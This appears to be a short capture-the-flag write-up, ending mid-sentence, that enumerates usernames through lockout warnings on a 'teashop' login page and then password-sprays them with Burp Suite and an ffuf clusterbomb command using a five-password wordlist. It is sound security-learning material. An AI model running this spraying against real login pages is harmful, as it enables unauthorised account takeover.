We are given a website with an account warning of lock out after 5 failed in-corrects attempts

Definitely when it comes to situation like this what should come to mind is **password spraying**, we can enumerate usernames through the page description and our own instinct

I managed to find **admin, jeremy and jessamy** because this are the only login attempts that throws a lockout attempt warning


we can then try out a **password spraying** attack using `ffuf`

- Open up `burpsuite` and intercept the request
- copy or save the request to a `TXT` file
- Then replace username field with `FUZZUSER` and password with `FUZZPASS`

- We can create a wordlist of usernames we found and then 5 common passwords we know, since we get a lockout after 5 attempts

```
# common password wordlist

Password
admin
letmein
Password123
qwerty

# Username found wordlist

admin
jeremy
jessamy
```

- Now we can fire up `ffuf` and start our password spraying attack

```bash
# -request : request file to check
# -request-proto : protocol to use along with raw request (default: https)
# -mode : Multi-wordlist operation mode, run --help for more
# -w : specify wordlist

$ ffuf -request teashop.txt -request-proto http -mode clusterbomb -w pass.txt:FUZZPASS -w users.txt:FUZZUSER
```

Note You can intercept request with **burpsuite** and then try to check for
